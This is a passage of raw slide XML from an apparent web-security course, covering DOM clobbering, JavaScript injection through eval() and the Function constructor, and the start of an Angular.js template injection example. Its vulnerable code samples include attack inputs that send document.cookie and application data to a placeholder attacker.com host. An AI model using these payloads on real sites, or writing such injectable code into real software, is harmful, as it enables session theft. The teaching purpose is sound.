            </a:pP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&lt;!-- Now window.config.apiUrl points to attacker's server! --&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="5610225"/>
            <a:ext cx="1913811" cy="239078"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="5956935"/>
            <a:ext cx="8803719" cy="1148477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907030" y="5956935"/>
            <a:ext cx="8816340" cy="1148477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3034546" y="6052542"/>
            <a:ext cx="8561308" cy="957263"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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console.log(window.config.apiUrl);</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Output: "https://attacker.com/evil"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Application sends sensitive data to attacker's server</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fetch(window.config.apiUrl + '/data');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>// Sends request to: https://attacker.com/evil/data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689265" y="1126450"/>
            <a:ext cx="2998232" cy="335161"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.4 JavaScript Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="1493282"/>
            <a:ext cx="2164556" cy="251341"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Direct Code Execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="1863447"/>
            <a:ext cx="9251871" cy="170617"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="2123122"/>
            <a:ext cx="9251871" cy="883444"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6375"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2682597" y="2123122"/>
            <a:ext cx="9265206" cy="883444"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2277"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816662" y="2223611"/>
            <a:ext cx="8997077" cy="682466"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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eval() is dangerous!</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let userInput = prompt("Enter calculation:");</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let result = eval(userInput);</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console.log("Result: " + result);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="3095625"/>
            <a:ext cx="9251871" cy="170617"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="3355300"/>
            <a:ext cx="9251871" cy="883444"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6375"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2682597" y="3355300"/>
            <a:ext cx="9265206" cy="883444"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2277"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816662" y="3455789"/>
            <a:ext cx="8997077" cy="682466"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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User enters:</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fetch('https://attacker.com/steal?cookie=' + document.cookie)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Code executes and steals cookies!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="4357568"/>
            <a:ext cx="2966918" cy="251341"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Function Constructor Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="4727734"/>
            <a:ext cx="9251871" cy="170617"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="4987409"/>
            <a:ext cx="9251871" cy="712827"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7900"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2682597" y="4987409"/>
            <a:ext cx="9265206" cy="712827"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2822"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816662" y="5087898"/>
            <a:ext cx="8997077" cy="511850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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let operation = request.query.operation; // User input</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let calculator = new Function('a', 'b', 'return a ' + operation + ' b');</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console.log(calculator(5, 3));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="5789295"/>
            <a:ext cx="9251871" cy="170617"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689265" y="6048970"/>
            <a:ext cx="9251871" cy="1054060"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5343"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2682597" y="6048970"/>
            <a:ext cx="9265206" cy="1054060"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1908"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816662" y="6149459"/>
            <a:ext cx="8997077" cy="853083"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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User provides:</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+ 0; fetch('https://attacker.com/steal?cookie=' + document.cookie); //</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Resulting function:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>new Function('a', 'b', 'return a + 0; fetch("https://attacker.com/steal?cookie=" + document.cookie); // b');</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4.5 Client-Side Template Injection (CSTI)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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54931" y="1025009"/>
            <a:ext cx="4800719" cy="431840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Angular.js Template Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354931" y="1785699"/>
            <a:ext cx="2159437" cy="269915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354931" y="2203609"/>
            <a:ext cx="5749409" cy="3179445"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2282"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1346359" y="2203609"/>
            <a:ext cx="5766554" cy="3179445"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519118" y="2333149"/>
            <a:ext cx="5421035" cy="2920365"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;!-- Angular.js application --&gt;</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&lt;div ng-app&gt;</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&lt;p&gt;Welcome, {{username}}&lt;/p&gt;</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&lt;/div&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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&lt;script&gt;</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Username comes from URL parameter</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let username = new URLSearchParams(window.location.search).get('name');</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document.querySelector('p').innerHTML = 'Welcome, {{' + username + '}}';</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354931" y="5531048"/>
            <a:ext cx="2159437" cy="269915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack URL:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354931" y="5948958"/>
            <a:ext cx="5749409" cy="745808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9729"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1346359" y="5948958"/>
            <a:ext cx="5766554" cy="745808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
